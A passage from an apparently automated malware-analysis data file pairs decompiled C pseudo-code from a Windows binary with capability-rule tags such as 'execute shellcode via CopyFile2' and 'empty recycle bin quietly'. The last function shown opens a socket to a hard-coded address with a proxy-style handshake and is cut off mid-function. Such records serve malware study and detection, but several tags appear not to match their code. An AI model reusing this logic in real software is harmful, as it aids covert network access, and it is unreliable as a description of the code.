-0x2c) + 8))(*(unaff_EBP + -0x2c));\n                        *(unaff_EBP + -0x2c) = 0;\n                        (**(**(unaff_EBP + -0x28) + 8))(*(unaff_EBP + -0x28));\n                        *(unaff_EBP + -0x28) = 0;\n                        (**(**(unaff_EBP + -0x24) + 8))(*(unaff_EBP + -0x24));\n                        *(unaff_EBP + -0x24) = 0;\n                        (**(**(unaff_EBP + -0x1c) + 8))(*(unaff_EBP + -0x1c));\n                        *(unaff_EBP + -0x1c) = 0;\n                        (**(**(unaff_EBP + -0x20) + 8))(*(unaff_EBP + -0x20));\n                        *(unaff_EBP + -0x20) = 0;\n                        fcn.0040fd40(0x401304, unaff_EBP + -0x10, 0xfffffffe);\n                    }\n                    goto code_r0x0040a830;\n                }\n                (**(**(unaff_EBP + -0x24) + 8))(*(unaff_EBP + -0x24));\n                piVar2 = *(unaff_EBP + -0x1c);\n                iVar1 = *piVar2;\n            }\n            (**(iVar1 + 8))(piVar2);\n        }\n        (**(**(unaff_EBP + -0x20) + 8))(*(unaff_EBP + -0x20));\n    }\n    fcn.0040fd40(0x401304, unaff_EBP + -0x10, 0xfffffffe);\ncode_r0x0040a830:\n    fcn.0040e005();\n    return;\n}\n",
        "token_count": 1826
    },
    "00405cd6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405cd6(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x402100;\n    fcn.0040b93a();\n    if ((arg_8h & 1) != 0) {\n        fcn.0040b84b();\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "0040b373": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b373(uint32_t arg_8h)\n\n{\n    fcn.0040b93a();\n    if ((arg_8h & 1) != 0) {\n        fcn.0040b84b();\n    }\n    return;\n}\n",
        "token_count": 62
    },
    "0040d362": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d362(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_10h;\n    uint var_4h;\n    \n    do {\n        iVar2 = fcn.0040d46a(arg_8h);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar2 = fcn.0040e317(arg_8h);\n    } while (iVar2 != 0);\n    if ((*0x4135ac & 1) == 0) {\n        *0x4135ac = *0x4135ac | 1;\n        var_4h = 0x402108;\n        fcn.0040b856(&var_4h);\n        *0x4135a0 = 0x402100;\n        fcn.0040b834(0x412f3d);\n    }\n    fcn.0040b96c(0x4135a0);\n    var_10h = 0x402100;\n    fcn.0040d957(&var_10h, 0x413200);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 271
    },
    "0040b945": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b945(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4020d8;\n    fcn.0040b8c0();\n    if ((arg_8h & 1) != 0) {\n        fcn.0040b84b();\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "0040d321": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d321(uint32_t arg_8h)\n\n{\n    fcn.0040d311();\n    if ((arg_8h & 1) != 0) {\n        fcn.0040b84b();\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "00411e05": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411e05(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x405728;\n    fcn.0040b93a();\n    if ((arg_8h & 1) != 0) {\n        fcn.0040b84b();\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "00407a26": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407a26(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    \n    if ((arg_8h != 0) && (iVar1 = fcn.0040d362(arg_8h),  iVar1 == 0)) {\n        arg_8h = 0;\n        fcn.0040b8de(&arg_8h);\n        var_ch = 0x402100;\n        fcn.0040d957(&var_ch, 0x413200);\n    }\n    return;\n}\n",
        "token_count": 127
    },
    "0040834f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040834f(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *unaff_ESI;\n    \n    if (in_EAX == -1) {\n        fcn.0040b2d9(0x4049e4);\n    }\n    cVar1 = fcn.0040761d(0);\n    if (cVar1 != '\\0') {\n        fcn.0040843e(in_EAX);\n        unaff_ESI[4] = in_EAX;\n        if (0xf < unaff_ESI[5]) {\n            unaff_ESI = *unaff_ESI;\n        }\n        *(unaff_ESI + in_EAX) = 0;\n    }\n    return;\n}\n",
        "token_count": 172
    },
    "00408f41": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408f41(uint *arg_8h)\n\n{\n    int32_t arg_10h;\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *unaff_ESI;\n    uint32_t uVar5;\n    \n    uVar5 = 0xffffffff;\n    if (arg_8h[4] != 0xffffffff) {\n        uVar5 = arg_8h[4];\n    }\n    iVar2 = unaff_ESI[4];\n    if (-iVar2 - 1U <= uVar5) {\n        iVar2 = fcn.0040b2d9(0x4049e4);\n    }\n    if (uVar5 != 0) {\n        cVar1 = fcn.00407770(0);\n        if (cVar1 != '\\0') {\n            puVar3 = unaff_ESI;\n            puVar4 = unaff_ESI;\n            if (7 < unaff_ESI[5]) {\n                puVar3 = *unaff_ESI;\n                puVar4 = *unaff_ESI;\n            }\n            arg_10h = uVar5 * 2;\n            fcn.0040b9a0(puVar3 + arg_10h, puVar4, unaff_ESI[4] * 2);\n            if (unaff_ESI == arg_8h) {\n                puVar3 = unaff_ESI;\n                puVar4 = unaff_ESI;\n                if (7 < unaff_ESI[5]) {\n                    puVar3 = *unaff_ESI;\n                    puVar4 = *unaff_ESI;\n                }\n                fcn.0040b9a0(puVar3, puVar4, arg_10h);\n            }\n            else {\n                if (7 < arg_8h[5]) {\n                    arg_8h = *arg_8h;\n                }\n                puVar4 = unaff_ESI;\n                if (7 < unaff_ESI[5]) {\n                    puVar4 = *unaff_ESI;\n                }\n                fcn.0040b3b0(puVar4, arg_8h, arg_10h);\n            }\n            unaff_ESI[4] = iVar2 + uVar5;\n            if (7 < unaff_ESI[5]) {\n                unaff_ESI = *unaff_ESI;\n            }\n            *(unaff_ESI + (iVar2 + uVar5) * 2) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 565
    },
    "0040987c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00409dd6)\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Variable defined which should be unmapped: var_74h\n// WARNING: Variable defined which should be unmapped: var_90h\n// WARNING: Variable defined which should be unmapped: var_ach\n// WARNING: Variable defined which should be unmapped: var_c8h\n// WARNING: Variable defined which should be unmapped: var_bch\n// WARNING: Variable defined which should be unmapped: var_e4h\n\nvoid fcn.0040987c(void)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    uint unaff_EBX;\n    int32_t unaff_EBP;\n    char *pcVar5;\n    uint32_t unaff_EDI;\n    uint var_448h;\n    uint var_444h;\n    uint var_440h;\n    uint var_43ch;\n    uint var_438h;\n    uint var_434h;\n    uint var_42ch;\n    uint var_410h;\n    uint var_3f4h;\n    uint var_3d8h;\n    uint var_3bch;\n    uint var_3a0h;\n    uint var_384h;\n    uint var_368h;\n    uint var_34ch;\n    uint var_330h;\n    uint var_314h;\n    uint var_2f8h;\n    uint var_2dch;\n    uint var_2c0h;\n    uint var_2a4h;\n    uint var_288h;\n    uint var_26ch;\n    uint var_250h;\n    uint var_234h;\n    uint var_218h;\n    uint var_1fch;\n    uint var_1e0h;\n    uint var_1c4h;\n    uint var_1a8h;\n    uint var_18ch;\n    uint var_170h;\n    uint var_164h;\n    uint var_154h;\n    uint var_138h;\n    uint var_11ch;\n    uint var_100h;\n    uint var_e4h;\n    int32_t arg_8h_00;\n    uint var_c8h;\n    int32_t arg_8h_01;\n    uint arg_ch;\n    uint var_bch;\n    uint uVar6;\n    int32_t arg_ch_00;\n    int32_t arg_ch_01;\n    uint noname_3;\n    uint var_ach;\n    uint var_90h;\n    uint var_74h;\n    uint var_58h;\n    uint var_48h;\n    uint var_44h;\n    uint var_3ch;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    fcn.00405c90(unaff_EBX);\n    iVar4 = *(unaff_EBP + -0x20);\n    *(unaff_EBP + -0x42d) = 10;\n    iVar1 = iVar4;\n    if (*(unaff_EBP + -0xc) < 0x10) {\n        iVar1 = unaff_EBP + -0x20;\n    }\n    if (*(unaff_EBP + -0xc) < 0x10) {\n        iVar4 = unaff_EBP + -0x20;\n    }\n    fcn.00407ba2(unaff_EBP + -0x438, iVar4, iVar1 + *(unaff_EBP + -0x10));\n    iVar1 = *(unaff_EBP + -0x20);\n    if (*(unaff_EBP + -0xc) < 0x10) {\n        iVar1 = unaff_EBP + -0x20;\n    }\n    fcn.004072b8(*(unaff_EBP + -0x438), iVar1 + *(unaff_EBP + -0x10));\n    iVar4 = *(unaff_EBP + -0x20);\n    *(unaff_EBP + -0x42d) = 0xd;\n    iVar1 = iVar4;\n    if (*(unaff_EBP + -0xc) < 0x10) {\n        iVar1 = unaff_EBP + -0x20;\n    }\n    if (*(unaff_EBP + -0xc) < 0x10) {\n        iVar4 = unaff_EBP + -0x20;\n    }\n    fcn.00407ba2(unaff_EBP + -0x438, iVar4, iVar1 + *(unaff_EBP + -0x10));\n    iVar1 = *(unaff_EBP + -0x20);\n    if (*(unaff_EBP + -0xc) < 0x10) {\n        iVar1 = unaff_EBP + -0x20;\n    }\n    uVar2 = *(unaff_EBP + -0x438);\n    fcn.004072b8(uVar2, iVar1 + *(unaff_EBP + -0x10));\n    iVar1 = *0x41439c - *0x414398;\n    *(unaff_EBP + -0x434) = *(unaff_EBP + -0x434) & unaff_EDI;\n    if (iVar1 / 0x1c != 0) {\n        *(unaff_EBP + -0x43c) = *(unaff_EBP + -0x43c) & unaff_EDI;\n        do {\n            iVar4 = *(unaff_EBP + -0x434);\n            uVar2 = *(*0x4143a8 + iVar4 * 4);\n            iVar1 = unaff_EBP + -0x30;\n            fcn.0040d5b8(uVar2, iVar1, 0x10, 10);\n            noname_3 = 0x10;\n            arg_ch_01 = unaff_EBP + -0x164;\n            fcn.0040d5b8(*(*0x4143c8 + iVar4 * 4), arg_ch_01, 0x10, 10);\n            fcn.0040d5b8(*(*0x414388 + iVar4 * 4), unaff_EBP + -0xbc, 0x10, 10);\n            arg_ch_00 = *(unaff_EBP + -0x43c) + *0x4143b8;\n            uVar6 = 0x4053bc;\n            fcn.0040720a(0x4053bc);\n            arg_8h = unaff_EBP + -0x1e0;\n            uVar2 = fcn.0040aeb4(arg_8h, uVar6, arg_ch_01, noname_3, 10, uVar2, iVar1);\n            *(unaff_EBP + -0x448) = uVar2;\n            arg_ch = 0x4053c8;\n            fcn.0040720a(0x4053c8);\n            arg_8h_01 = unaff_EBP + -0x100;\n            uVar2 = fcn.0040aeb4(arg_8h_01, arg_ch, arg_8h, uVar6, arg_ch_01, noname_3, 10);\n            *(unaff_EBP + -0x440) = uVar2;\n            fcn.0040720a(0x4053e4);\n            arg_8h_00 = unaff_EBP + -0x1a8;\n            uVar2 = fcn.0040aeb4(arg_8h_00, 0x4053e4, arg_8h_01, arg_ch, arg_8h, uVar6, arg_ch_01);\n            iVar1 = unaff_EBP + -0x30;\n            *(unaff_EBP + -0x444) = uVar2;\n            uVar6 = 0x405400;\n            fcn.0040720a(0x405400);\n            iVar4 = unaff_EBP + -0x74;\n            uVar2 = fcn.0040aeb4(iVar4, uVar6, arg_8h_00, 0x4053e4, arg_8h_01, arg_ch, arg_8h);\n            *(unaff_EBP + -0x438) = uVar2;\n            uVar2 = 0x405418;\n            fcn.0040720a(0x405418);\n            fcn.0040aeb4(unaff_EBP + -0x218, uVar2, iVar4, uVar6, arg_8h_00, 0x4053e4, arg_8h_01);\n            fcn.0040a445(0x405434);\n            fcn.00407b3a();\n            fcn.00407b7e(unaff_EBP + -0xe4, arg_8h);\n            uVar2 = fcn.00407b3a();\n            fcn.00407b0e(uVar2, arg_ch_00);\n            uVar2 = fcn.00407b3a();\n            fcn.00407b0e(uVar2, arg_ch_01);\n            uVar2 = fcn.00407b3a();\n            fcn.00407b0e(uVar2, iVar1);\n            uVar2 = fcn.00407b3a();\n            fcn.00407c89(uVar2, 0);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            uVar2 = 1;\n            fcn.00405c90(1);\n            iVar1 = *0x41439c - *0x414398;\n            *(unaff_EBP + -0x434) = *(unaff_EBP + -0x434) + 1;\n            *(unaff_EBP + -0x43c) = *(unaff_EBP + -0x43c) + 0x1c;\n        } while (*(unaff_EBP + -0x434) < iVar1 / 0x1c);\n    }\n    iVar1 = fcn.0040d260(0x405438);\n    *(unaff_EBP + -0x43c) = iVar1;\n    if ((iVar1 != 0) && (*(unaff_EBP + -0x10) != 0)) {\n        iVar1 = *(unaff_EBP + -0x20);\n        if (*(unaff_EBP + -0xc) < 0x10) {\n            iVar1 = unaff_EBP + -0x20;\n        }\n        pcVar5 = iVar1 + *(unaff_EBP + -0x10) + -1;\n        while( true ) {\n            iVar1 = fcn.0040d5f0(0x405438, *pcVar5, *(unaff_EBP + -0x43c));\n            pcVar3 = *(unaff_EBP + -0x20);\n            if (iVar1 != 0) break;\n            if (*(unaff_EBP + -0xc) < 0x10) {\n                pcVar3 = unaff_EBP + -0x20;\n            }\n            if (pcVar5 == pcVar3) break;\n            pcVar5 = pcVar5 + -1;\n        }\n    }\n    uVar6 = fcn.0040d260(0x40543c);\n    fcn.0040a075(uVar6);\n    *(unaff_EBP + -0x44) = 0xf;\n    *(unaff_EBP + -0x48) = 0;\n    *(unaff_EBP + -0x58) = 0;\n    *(unaff_EBP + -0x434) = 0;\n    if (*(unaff_EBP + -0x10) != 0) {\n        do {\n            iVar1 = *(unaff_EBP + -0x20);\n            if (*(unaff_EBP + -0xc) < 0x10) {\n                iVar1 = unaff_EBP + -0x20;\n            }\n            *(unaff_EBP + -0x438) = *(iVar1 + *(unaff_EBP + -0x434));\n            *(unaff_EBP + -0x28) = 0xf;\n            *(unaff_EBP + -0x2c) = 0;\n            *(unaff_EBP + -0x3c) = 0;\n            fcn.00407c07();\n            fcn.00407c89(unaff_EBP + -0x58, 0);\n            fcn.0040a493(*(unaff_EBP + -0x438));\n            fcn.004073be();\n            fcn.00405c90(1);\n            if ((1000 < *(unaff_EBP + -0x48)) || (*(unaff_EBP + -0x434) + 1 == *(unaff_EBP + -0x10))) {\n                fcn.004082ae();\n                fcn.0040d260(0x40543f);\n                fcn.004075b4();\n            }\n            *(unaff_EBP + -0x434) = *(unaff_EBP + -0x434) + 1;\n        } while (*(unaff_EBP + -0x434) < *(unaff_EBP + -0x10));\n    }\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.0040b39f(uVar2);\n    return;\n}\n",
        "token_count": 3758
    },
    "0040b20a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0040b20a(uint *arg_8h, uint noname_1, uint noname_2, uint noname_3, uint32_t arg_18h, uint32_t arg_1ch, \n            uint noname_6, uint *arg_24h, uint noname_8, uint noname_9, uint noname_10, uint32_t arg_34h, \n            uint32_t arg_38h)\n\n{\n    uint32_t arg_10h;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint var_8h;\n    uint *var_4h;\n    \n    arg_10h = arg_34h;\n    puVar3 = arg_24h;\n    if (arg_38h < 0x10) {\n        puVar3 = &arg_24h;\n    }\n    if (arg_34h != 0) {\n        if ((arg_18h != 0) && (arg_34h <= arg_18h)) {\n            iVar5 = (arg_18h - arg_34h) + 1;\n            var_4h = arg_8h;\n            if (arg_1ch < 0x10) {\n                var_4h = &arg_8h;\n            }\n            while (iVar2 = fcn.0040d5f0(var_4h, *puVar3, iVar5),  iVar2 != 0) {\n                iVar1 = fcn.0040bd01(iVar2, puVar3, arg_10h);\n                if (iVar1 == 0) {\n                    puVar3 = arg_8h;\n                    if (arg_1ch < 0x10) {\n                        puVar3 = &arg_8h;\n                    }\n                    iVar2 = iVar2 - puVar3;\n                    goto code_r0x0040b27e;\n                }\n                iVar5 = var_4h + ((iVar5 + -1) - iVar2);\n                var_4h = iVar2 + 1;\n            }\n        }\n        iVar2 = -1;\ncode_r0x0040b27e:\n        if (iVar2 == -1) {\n            uVar4 = 0;\n            goto code_r0x0040b286;\n        }\n    }\n    uVar4 = 1;\ncode_r0x0040b286:\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    return uVar4;\n}\n",
        "token_count": 570
    },
    "004078fc": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004078fc(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    int32_t unaff_EBP;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00411c3c(0xc);\n    piVar1 = *(unaff_EBP + 8);\n    uVar6 = *(unaff_EBP + 0xc) | 7;\n    if (uVar6 < 0x7fffffff) {\n        *(unaff_EBP + -0x14) = piVar1[5];\n        *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) >> 1;\n        uVar2 = *(unaff_EBP + -0x14);\n        if ((uVar6 / 3 < uVar2) && (uVar6 = uVar2 + piVar1[5],  0x7ffffffe - uVar2 < piVar1[5])) {\n            uVar6 = 0x7ffffffe;\n        }\n    }\n    else {\n        uVar6 = *(unaff_EBP + 0xc);\n    }\n    *(unaff_EBP + -4) = 0;\n    uVar4 = fcn.00407a6f();\n    *(unaff_EBP + -0x18) = uVar4;\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + 0x10) != 0) {\n        piVar5 = piVar1;\n        if (7 < piVar1[5]) {\n            piVar5 = *piVar1;\n        }\n        fcn.0040b3b0(*(unaff_EBP + -0x18), piVar5, *(unaff_EBP + 0x10) * 2);\n    }\n    fcn.00407574(1);\n    piVar5 = *(unaff_EBP + -0x18);\n    *piVar1 = piVar5;\n    piVar1[5] = uVar6;\n    iVar3 = *(unaff_EBP + 0x10);\n    piVar1[4] = iVar3;\n    if (uVar6 < 8) {\n        piVar5 = piVar1;\n    }\n    *(piVar5 + iVar3 * 2) = 0;\n    fcn.00411c72();\n    return;\n}\n",
        "token_count": 607
    },
    "00408398": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408398(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *extraout_ECX;\n    \n    iVar1 = *param_1;\n    uVar2 = (param_1[1] - iVar1) / 0x1c;\n    if (0x9249248 < uVar2) {\n        fcn.0040b2d9(0x404a14);\n        param_1 = extraout_ECX;\n    }\n    uVar3 = (param_1[2] - iVar1) / 0x1c;\n    uVar2 = uVar2 + 1;\n    if (uVar3 < uVar2) {\n        if (0x9249249 - (uVar3 >> 1) < uVar3) {\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = uVar3 + (uVar3 >> 1);\n        }\n        if (uVar3 < uVar2) {\n            uVar3 = uVar2;\n        }\n        fcn.00408472(uVar3);\n    }\n    return;\n}\n",
        "token_count": 270
    },
    "004083ef": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004083ef(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *extraout_ECX;\n    uint32_t uVar3;\n    uint32_t extraout_EDX;\n    \n    iVar1 = *param_1;\n    uVar3 = param_1[1] - iVar1 >> 2;\n    if (0x3ffffffe < uVar3) {\n        fcn.0040b2d9(0x404a14);\n        param_1 = extraout_ECX;\n        uVar3 = extraout_EDX;\n    }\n    uVar3 = uVar3 + 1;\n    uVar2 = param_1[2] - iVar1 >> 2;\n    if (uVar2 < uVar3) {\n        if (0x3fffffff - (uVar2 >> 1) < uVar2) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = uVar2 + (uVar2 >> 1);\n        }\n        if (uVar2 < uVar3) {\n            uVar2 = uVar3;\n        }\n        fcn.0040854a(uVar2);\n    }\n    return;\n}\n",
        "token_count": 279
    },
    "0040854a": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040854a(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    int32_t *extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint32_t uVar3;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00411c3c(8);\n    uVar3 = *(unaff_EBP + 8);\n    if (0x3fffffff < uVar3) {\n        fcn.0040b2d9(0x404a14);\n        uVar3 = extraout_ECX_00;\n    }\n    if (extraout_ECX[2] - *extraout_ECX >> 2 < uVar3) {\n        arg_8h_00 = fcn.0040862a();\n        *(unaff_EBP + -0x14) = arg_8h_00;\n        *(unaff_EBP + -4) = 0;\n        fcn.0040b9a0(arg_8h_00, *extraout_ECX, extraout_ECX[1] - *extraout_ECX & 0xfffffffc);\n        *(unaff_EBP + -4) = 0xffffffff;\n        iVar1 = *extraout_ECX;\n        iVar2 = extraout_ECX[1];\n        if (iVar1 != 0) {\n            fcn.0040b84b(iVar1);\n        }\n        extraout_ECX[2] = arg_8h_00 + *(unaff_EBP + 8) * 4;\n        extraout_ECX[1] = arg_8h_00 + (iVar2 - iVar1 >> 2) * 4;\n        *extraout_ECX = arg_8h_00;\n    }\n    fcn.00411c72();\n    return;\n}\n",
        "token_count": 448
    },
    "0040a72c": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a72c(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t var_4h;\n    \n    uVar3 = 0;\n    *in_EAX = 0;\n    in_EAX[1] = 0;\n    iVar2 = 0;\n    do {\n        in_EAX[iVar2 + 2] = iVar2;\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x100);\n    iVar2 = 0;\n    var_4h = 0;\n    do {\n        uVar1 = in_EAX[var_4h + 2];\n        uVar3 = *(iVar2 + arg_8h) + uVar3 + uVar1;\n        iVar2 = iVar2 + 1;\n        in_EAX[var_4h + 2] = in_EAX[uVar3 + 2];\n        in_EAX[uVar3 + 2] = uVar1;\n        if (6 < iVar2) {\n            iVar2 = 0;\n        }\n        var_4h = var_4h + 1;\n    } while (var_4h < 0x100);\n    return;\n}\n",
        "token_count": 290
    },
    "0040a9be": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0040a9be(uint *arg_8h, uint noname_1, uint noname_2, uint noname_3, int32_t arg_18h, uint32_t arg_1ch, uint noname_6\n            , uint arg_24h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    ushort uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint *puVar6;\n    uint32_t unaff_EBX;\n    uint unaff_ESI;\n    uchar *puVar7;\n    uint uVar8;\n    uint arg_ch;\n    uint uVar9;\n    uchar *arg_8h_00;\n    char cVar10;\n    uint32_t uVar11;\n    uchar auStack580 [4];\n    uint uStack576;\n    ushort uStack572;\n    uint uStack568;\n    uint ***apppuStack556 [4];\n    uint uStack540;\n    uint32_t uStack536;\n    uchar auStack516 [92];\n    uchar auStack424 [372];\n    uchar auStack52 [21];\n    char cStack31;\n    uint32_t uStack12;\n    \n    cVar10 = unaff_ESI >> 0x18;\n    uStack12 = *0x401304 ^ auStack580;\n    arg_8h_00 = auStack424;\n    uVar9 = 0x202;\n    iVar4 = (*_sym.imp.WS2_32.dll_WSAStartup)();\n    if (iVar4 == 0) {\n        uVar8 = 2;\n        uVar5 = (*_sym.imp.WS2_32.dll_socket)();\n        pcVar1 = _sym.imp.WS2_32.dll_htons;\n        uStack572 = 2;\n        uVar3 = (*_sym.imp.WS2_32.dll_htons)();\n        uStack576 = CONCAT22(uVar3, uStack576);\n        uStack576 = (*_sym.imp.WS2_32.dll_inet_addr)(0x405538);\n        puVar7 = auStack580;\n        (*_sym.imp.WS2_32.dll_connect)(uVar9, puVar7, 0x10);\n        pcVar2 = _sym.imp.WS2_32.dll_send;\n        (*_sym.imp.WS2_32.dll_send)(uVar8, &stack0xfffffda0, 3, 0);\n        (*_sym.imp.WS2_32.dll_recv)(puVar7, &stack0xfffffd98, 2, 0);\n        if (uStack568._1_1_ == '\\0') {\n            uVar11 = unaff_EBX & 0xffffff | arg_18h << 0x18;\n            uStack568 = (*pcVar1)();\n            uStack568 = uStack568 & 0xffff;\n            uStack576 = 0x3000105;\n            iVar4 = fcn.0040b394();\n            fcn.0040b3b0(iVar4, &uStack576, 4);\n            fcn.0040b3b0(iVar4 + 4, &stack0xfffffdb7, 1);\n            puVar6 = arg_8h;\n            if (arg_1ch < 0x10) {\n                puVar6 = &arg_8h;\n            }\n            fcn.0040b3b0(iVar4 + 5, puVar6, cVar10);\n            fcn.0040b3b0(cVar10 + 5 + iVar4, &uStack568, 2);\n            (*pcVar2)(uVar11);\n            fcn.0040d306(iVar4);\n            (*_sym.imp.WS2_32.dll_recv)(uVar9, auStack52, 10, 0);\n            if (cStack31 == '\\0') {\n                arg_ch = 0x405544;\n                puVar6 = &arg_8h;\n                uVar8 = 0x405564;\n          